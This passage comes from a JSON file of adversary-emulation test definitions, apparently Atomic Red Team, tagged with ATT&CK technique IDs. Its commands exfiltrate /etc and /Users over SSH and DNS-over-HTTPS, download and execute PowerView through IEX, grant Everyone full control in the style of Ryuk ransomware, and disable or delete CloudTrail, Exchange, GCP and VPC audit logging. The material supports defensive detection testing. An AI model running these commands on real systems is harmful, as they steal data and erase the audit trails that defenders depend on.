		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"domain": {
				"description": "target SSH domain",
				"type": "url",
				"default": "target.example.com"
			}
		},
		"executor": {
			"command": "ssh #{domain} \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1048",
		"phases": ["exfiltration"]
	},
	{
		"name": "Exfiltration Over Alternative Protocol - SSH",
		"auto_generated_guid": "7c3cb337-35ae-4d06-bf03-3032ed2ec268",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"user_name": {
				"description": "username for domain",
				"type": "string",
				"default": "atomic"
			},
			"password": {
				"description": "password for user",
				"type": "string",
				"default": "atomic"
			},
			"domain": {
				"description": "target SSH domain",
				"type": "url",
				"default": "target.example.com"
			}
		},
		"executor": {
			"command": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1048",
		"phases": ["exfiltration"]
	},
	{
		"name": "DNSExfiltration (doh)",
		"auto_generated_guid": "c943d285-ada3-45ca-b3aa-7cd6500c6a48",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"password": {
				"description": "Password used to encrypt the data to be exfiltrated",
				"type": "string",
				"default": "atomic"
			},
			"domain": {
				"description": "The domain name to use for DNS requests",
				"type": "string",
				"default": "target.example.com"
			},
			"ps_module": {
				"description": "DNSExfiltrator powershell ps_module",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1"
			},
			"doh": {
				"description": "Google or CloudFlare DoH (DNS over HTTP) server",
				"type": "string",
				"default": "google"
			},
			"time": {
				"description": "The time in milliseconds to wait between each DNS request",
				"type": "string",
				"default": "500"
			},
			"encoding": {
				"description": "Set to '-b32' to use base32 encoding of data. Might be required by some DNS resolvers.",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "DNSExfiltrator powershell file must exist on disk at specified location (#{ps_module})\n",
				"prereq_command": "if (Test-Path \"#{ps_module}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIWR \"https://raw.githubusercontent.com/Arno0x/DNSExfiltrator/8faa972408b0384416fffd5b4d42a7aa00526ca8/Invoke-DNSExfiltrator.ps1\" -OutFile \"#{ps_module}\"\n"
			}
		],
		"executor": {
			"command": "Import-Module \"#{ps_module}\"\nInvoke-DNSExfiltrator -i \"#{ps_module}\" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1048",
		"phases": ["exfiltration"]
	},
	{
		"name": "Add a driver",
		"auto_generated_guid": "cb01b3da-b0e7-4e24-bf6d-de5223526785",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"driver_inf": {
				"description": "A built-in, already installed windows driver inf",
				"type": "path",
				"default": "C:\\Windows\\INF\\usbstor.inf"
			}
		},
		"executor": {
			"command": "pnputil.exe /add-driver \"#{driver_inf}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1547",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Take ownership using takeown utility",
		"auto_generated_guid": "98d34bb4-6e75-42ad-9c41-1dae7dc6a001",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_folder_to_own": {
				"description": "Path of the file or folder for takeown to take ownership.",
				"type": "path",
				"default": "%temp%\\T1222.001_takeown_folder"
			}
		},
		"dependency_executor_name": "command_prompt",
		"dependencies": [
			{
				"description": "Test requrires a file to take ownership of to be located at (#{file_folder_to_own})\n",
				"prereq_command": "IF EXIST #{file_folder_to_own} ( EXIT 0 ) ELSE ( EXIT 1 )\n",
				"get_prereq_command": "mkdir #{file_folder_to_own}\necho T1222.001_takeown1 >> #{file_folder_to_own}\\T1222.001_takeown1.txt\necho T1222.001_takeown2 >> #{file_folder_to_own}\\T1222.001_takeown2.txt\n"
			}
		],
		"executor": {
			"command": "takeown.exe /f #{file_folder_to_own} /r\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1222.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "cacls - Grant permission to specified user or group recursively",
		"auto_generated_guid": "a8206bcc-f282-40a9-a389-05d9c0263485",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_or_folder": {
				"description": "Path of the file or folder to change permissions.",
				"type": "path",
				"default": "%temp%\\T1222.001_cacls"
			},
			"user_or_group": {
				"description": "User or group to allow full control",
				"type": "string",
				"default": "Everyone"
			}
		},
		"dependency_executor_name": "command_prompt",
		"dependencies": [
			{
				"description": "Test requrires a file to modify to be located at (#{file_or_folder})\n",
				"prereq_command": "IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )\n",
				"get_prereq_command": "mkdir #{file_or_folder}\necho T1222.001_cacls1 >> #{file_or_folder}\\T1222.001_cacls1.txt\necho T1222.001_cacls2 >> #{file_or_folder}\\T1222.001_cacls2.txt\n"
			}
		],
		"executor": {
			"command": "icacls.exe #{file_or_folder} /grant #{user_or_group}:F\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1222.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "attrib - Remove read-only attribute",
		"auto_generated_guid": "bec1e95c-83aa-492e-ab77-60c71bbd21b0",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_or_folder": {
				"description": "Path of the file or folder remove attribute.",
				"type": "path",
				"default": "%temp%\\T1222.001_attrib"
			}
		},
		"dependency_executor_name": "command_prompt",
		"dependencies": [
			{
				"description": "Test requrires a file to modify to be located at (#{file_or_folder})\n",
				"prereq_command": "IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )\n",
				"get_prereq_command": "mkdir #{file_or_folder}\necho T1222.001_attrib1 >> #{file_or_folder}\\T1222.001_attrib1.txt\necho T1222.001_attrib2 >> #{file_or_folder}\\T1222.001_attrib2.txt\nattrib.exe +r #{file_or_folder}\\T1222.001_attrib1.txt\nattrib.exe +r #{file_or_folder}\\T1222.001_attrib2.txt\n"
			}
		],
		"executor": {
			"command": "attrib.exe -r #{file_or_folder}\\*.* /s\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1222.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "attrib - hide file",
		"auto_generated_guid": "32b979da-7b68-42c9-9a99-0e39900fc36c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_or_folder": {
				"description": "Path of the files to hide.",
				"type": "path",
				"default": "%temp%\\T1222.001_attrib_2"
			}
		},
		"executor": {
			"command": "mkdir #{file_or_folder} >nul 2>&1\necho T1222.001_attrib1 >> #{file_or_folder}\\T1222.001_attrib1.txt\necho T1222.001_attrib2 >> #{file_or_folder}\\T1222.001_attrib2.txt\nattrib.exe +h #{file_or_folder}\\T1222.001_attrib1.txt\nattrib.exe +h #{file_or_folder}\\T1222.001_attrib2.txt\n",
			"cleanup_command": "del /A:H #{file_or_folder}\\T1222.001_attrib*.txt >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1222.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Grant Full Access to folder for Everyone - Ryuk Ransomware Style",
		"auto_generated_guid": "ac7e6118-473d-41ec-9ac0-ef4f1d1ed2f6",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"path": {
				"description": "Path of folder to recursively set permissions on",
				"type": "path",
				"default": "C:\\Users\\Public\\*"
			},
			"file_path": {
				"description": "Path of folder permission back",
				"type": "path",
				"default": "%temp%\\T1222.001-folder-perms-backup.txt"
			}
		},
		"dependency_executor_name": "command_prompt",
		"dependencies": [
			{
				"description": "Backup of original folder permissions should exist (for use in cleanup commands)\n",
				"prereq_command": "IF EXIST #{file_path} ( EXIT 0 ) ELSE ( EXIT 1 )\n",
				"get_prereq_command": "icacls #{path} /save #{file_path} /t /q >nul 2>&1\n"
			}
		],
		"executor": {
			"command": "icacls \"#{path}\" /grant Everyone:F /T /C /Q",
			"cleanup_command": "icacls '#{path}' /restore #{file_path} /q >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1222.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "AWS - CloudTrail Changes",
		"auto_generated_guid": "9c10dc6b-20bd-403a-8e67-50ef7d07ed4e",
		"supported_platforms": ["iaas:aws"],
		"input_arguments": {
			"cloudtrail_name": {
				"description": "Name of the cloudTrail",
				"type": "string",
				"default": "redatomictesttrail"
			},
			"s3_bucket_name": {
				"description": "Name of the bucket",
				"type": "string",
				"default": "redatomic-test"
			},
			"region": {
				"description": "Name of the region",
				"type": "string",
				"default": "us-east-1"
			}
		},
		"dependencies": [
			{
				"description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
				"prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
				"get_prereq_command": "echo Please install the aws-cli and configure your AWS default profile using: aws configure\n"
			},
			{
				"description": "Check if terraform is installed.\n",
				"prereq_command": "terraform version\n",
				"get_prereq_command": "echo Please install the terraform and configure your aws default profile \n"
			},
			{
				"description": "Check if the dependency resources are already present.\n",
				"prereq_command": "if [ -f \"$PathToAtomicsFolder/T1562.008/src/T1562.008-1/terraform.tfstate\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "cd \"$PathToAtomicsFolder/T1562.008/src/T1562.008-1/\"\nterraform init\nterraform apply -auto-approve\n"
			}
		],
		"executor": {
			"command": "aws cloudtrail update-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name}  --is-multi-region-trail --region #{region}\naws cloudtrail stop-logging --name #{cloudtrail_name} --region #{region}\naws cloudtrail delete-trail --name #{cloudtrail_name} --region #{region}\n",
			"cleanup_command": "cd \"$PathToAtomicsFolder/T1562.008/src/T1562.008-1/\"\nterraform destroy -auto-approve\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1562.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Azure - Eventhub Deletion",
		"auto_generated_guid": "5e09bed0-7d33-453b-9bf3-caea32bff719",
		"supported_platforms": ["iaas:azure"],
		"input_arguments": {
			"username": {
				"description": "Azure username",
				"type": "string",
				"default": null
			},
			"password": {
				"description": "Azure password",
				"type": "string",
				"default": null
			},
			"event_hub_name": {
				"description": "Name of the eventhub",
				"type": "string",
				"default": "test_eventhub"
			},
			"resource_group": {
				"description": "Name of the resource group",
				"type": "string",
				"default": null
			},
			"name_space_name": {
				"description": "Name of the NameSpace",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Install-Module -Name Az\n",
				"prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "Install-Module -Name AzureAD -Force\n"
			},
			{
				"description": "Check if terraform is installed.\n",
				"prereq_command": "terraform version\n",
				"get_prereq_command": "echo Please install the terraform.\n"
			},
			{
				"description": "Check if the user is logged into Azure.\n",
				"prereq_command": "az account show\n",
				"get_prereq_command": "echo Configure your Azure account using: az login. \n"
			},
			{
				"description": "Create dependency resources using terraform\n",
				"prereq_command": "try {if (Test-Path \"$PathToAtomicsFolder/T1562.008/src/T1562.008-2/terraform.tfstate\" ){ exit 0 } else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "cd \"$PathToAtomicsFolder/T1562.008/src/T1562.008-2/\"\nterraform init\nterraform apply -auto-approve\n"
			}
		],
		"executor": {
			"command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-AzureAD -Credential $creds\nRemove-AzEventHub -ResourceGroupName #{resource_group} -Namespace #{name_space_name} -Name #{event_hub_name}\n",
			"name": "powershell",
			"elevation_required": false,
			"cleanup_command": "cd \"$PathToAtomicsFolder/T1562.008/src/T1562.008-2/\"\nterraform destroy -auto-approve\n"
		},
		"attack_technique": "T1562.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Office 365 - Exchange Audit Log Disabled",
		"auto_generated_guid": "1ee572f3-056c-4632-a7fc-7e7c42b1543c",
		"supported_platforms": ["office-365"],
		"input_arguments": {
			"username": {
				"description": "office-365 username",
				"type": "string",
				"default": null
			},
			"password": {
				"description": "office-365 password",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "ExchangeOnlineManagement PowerShell module must be installed\n",
				"prereq_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n",
				"get_prereq_command": "Install-Module -Name ExchangeOnlineManagement         \nImport-Module ExchangeOnlineManagement\n"
			}
		],
		"executor": {
			"command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False\n",
			"cleanup_command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $True\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1562.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "AWS - Disable CloudTrail Logging Through Event Selectors using Stratus",
		"auto_generated_guid": "a27418de-bdce-4ebd-b655-38f11142bf0c",
		"supported_platforms": ["linux", "macos", "iaas:aws"],
		"input_arguments": {
			"stratus_path": {
				"description": "Path of stratus binary",
				"type": "path",
				"default": "$PathToAtomicsFolder/T1562.008/src"
			},
			"aws_region": {
				"description": "AWS region to detonate",
				"type": "string",
				"default": "us-west-2"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n",
				"prereq_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
			},
			{
				"description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
				"prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
				"get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
			}
		],
		"executor": {
			"command": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-event-selectors\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force\n",
			"cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1562.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "AWS - CloudTrail Logs Impairment Through S3 Lifecycle Rule using Stratus",
		"auto_generated_guid": "22d89a2f-d475-4895-b2d4-68626d49c029",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"stratus_path": {
				"description": "Path of stratus binary",
				"type": "path",
				"default": "$PathToAtomicsFolder/T1562.008/src"
			},
			"aws_region": {
				"description": "AWS region to detonate",
				"type": "string",
				"default": "us-west-2"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n",
				"prereq_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
			},
			{
				"description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
				"prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
				"get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
			}
		],
		"executor": {
			"command": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force\n",
			"cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1562.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "AWS - Remove VPC Flow Logs using Stratus",
		"auto_generated_guid": "93c150f5-ad7b-4ee3-8992-df06dec2ac79",
		"supported_platforms": ["linux", "macos", "iaas:aws"],
		"input_arguments": {
			"stratus_path": {
				"description": "Path of stratus binary",
				"type": "path",
				"default": "$PathToAtomicsFolder/T1562.008/src"
			},
			"aws_region": {
				"description": "AWS region to detonate",
				"type": "string",
				"default": "us-west-2"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n",
				"prereq_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
			},
			{
				"description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
				"prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
				"get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
			}
		],
		"executor": {
			"command": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.vpc-remove-flow-logs\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force\n",
			"cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1562.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "AWS - CloudWatch Log Group Deletes",
		"auto_generated_guid": "89422c87-b57b-4a04-a8ca-802bb9d06121",
		"supported_platforms": ["iaas:aws"],
		"input_arguments": {
			"cloudwatch_log_group_name": {
				"description": "Name of the cloudWatch log group",
				"type": "string",
				"default": "log-test"
			},
			"region": {
				"description": "Name of the region",
				"type": "string",
				"default": "us-east-1"
			}
		},
		"dependencies": [
			{
				"description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
				"prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
				"get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
			}
		],
		"executor": {
			"command": "aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Created ***\"\naws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Deleted ***\"\n",
			"cleanup_command": null,
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1562.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "AWS CloudWatch Log Stream Deletes",
		"auto_generated_guid": "33ca84bc-4259-4943-bd36-4655dc420932",
		"supported_platforms": ["iaas:aws"],
		"input_arguments": {
			"cloudwatch_log_group_name": {
				"description": "Name of the cloudWatch log group",
				"type": "string",
				"default": "test-logs"
			},
			"cloudwatch_log_stream_name": {
				"description": "Name of the cloudWatch log stream",
				"type": "string",
				"default": "20150601"
			},
			"region": {
				"description": "Name of the region",
				"type": "string",
				"default": "us-west-2"
			}
		},
		"dependencies": [
			{
				"description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
				"prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
				"get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
			}
		],
		"executor": {
			"command": "aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Created ***\"\naws logs create-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name}\necho \"*** Log Stream Created ***\"\naws logs delete-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name}\necho \"*** Log Stream Deleted ***\"\naws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Deleted ***\"\n",
			"cleanup_command": null,
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1562.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Office 365 - Set Audit Bypass For a Mailbox",
		"auto_generated_guid": "c9a2f6fe-7197-488c-af6d-10c782121ca6",
		"supported_platforms": ["office-365"],
		"input_arguments": {
			"username": {
				"description": "office-365 username",
				"type": "string",
				"default": "o365_user_test"
			},
			"password": {
				"description": "office-365 password",
				"type": "string",
				"default": "o365_password_test"
			},
			"target_email": {
				"description": "office-365 target_email",
				"type": "string",
				"default": "o365_email_test"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "ExchangeOnlineManagement PowerShell module must be installed\n",
				"prereq_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n",
				"get_prereq_command": "Install-Module -Name ExchangeOnlineManagement         \nImport-Module ExchangeOnlineManagement\n"
			}
		],
		"executor": {
			"command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-MailboxAuditBypassAssociation -Identity \"#{target_email}\" -AuditBypassEnabled $true\n",
			"cleanup_command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-MailboxAuditBypassAssociation -Identity \"#{target_email}\" -AuditBypassEnabled $false\nDisconnect-ExchangeOnline -Confirm:$false\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1562.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "GCP - Delete Activity Event Log",
		"auto_generated_guid": "d56152ec-01d9-42a2-877c-aac1f6ebe8e6",
		"supported_platforms": ["iaas:gcp"],
		"input_arguments": {
			"project-id": {
				"description": "ID of the GCP Project you to execute the command against.",
				"type": "string",
				"default": "atomic-project-1"
			}
		},
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "gcloud config set project #{project-id}\ngcloud logging logs delete projects/#{project-id}/logs/cloudaudit.googleapis.com%2Factivity --quiet\n"
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Requires gcloud\n",
				"prereq_command": "if [ -x \"$(command -v gcloud)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "echo \"Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install\"\n"
			},
			{
				"description": "Check if user is logged in \n",
				"prereq_command": "gcloud config get-value account\n",
				"get_prereq_command": "gcloud auth login --no-launch-browser\n"
			}
		],
		"attack_technique": "T1562.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Basic Permission Groups Discovery Windows (Domain)",
		"auto_generated_guid": "dd66d77d-8998-48c0-8024-df263dc2ce5d",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "net localgroup\nnet group /domain\nnet group \"enterprise admins\" /domain\nnet group \"domain admins\" /domain\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1069.002",
		"phases": ["discovery"]
	},
	{
		"name": "Permission Groups Discovery PowerShell (Domain)",
		"auto_generated_guid": "6d5d8c96-3d2a-4da9-9d6d-9a9d341899a7",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"user": {
				"description": "User to identify what groups a user is a member of",
				"type": "string",
				"default": "$env:USERNAME"
			}
		},
		"executor": {
			"command": "get-ADPrincipalGroupMembership #{user} | select name\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1069.002",
		"phases": ["discovery"]
	},
	{
		"name": "Elevated group enumeration using net group (Domain)",
		"auto_generated_guid": "0afb5163-8181-432e-9405-4322710c0c37",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "net groups \"Account Operators\" /doma\nnet groups \"Exchange Organization Management\" /doma\nnet group \"BUILTIN\\Backup Operators\" /doma\nnet group /domai \"Domain Admins\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1069.002",
		"phases": ["discovery"]
	},
	{
		"name": "Find machines where user has local admin access (PowerView)",
		"auto_generated_guid": "a2d71eee-a353-4232-9f86-54f4288dd8c1",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1069.002",
		"phases": ["discovery"]
	},
	{
		"name": "Find local admins on all machines in domain (PowerView)",
		"auto_generated_guid": "a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1069.002",
		"phases": ["discovery"]
	},
	{
		"name": "Find Local Admins via Group Policy (PowerView)",
		"auto_generated_guid": "64fdb43b-5259-467a-b000-1b02c00e510a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"computer_name": {
				"description": "hostname of the computer to analyze",
				"type": "path",
				"default": "$env:COMPUTERNAME"
			}
		},
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1069.002",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate Users Not Requiring Pre Auth (ASRepRoast)",
		"auto_generated_guid": "870ba71e-6858-4f6d-895c-bb6237f6121b",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
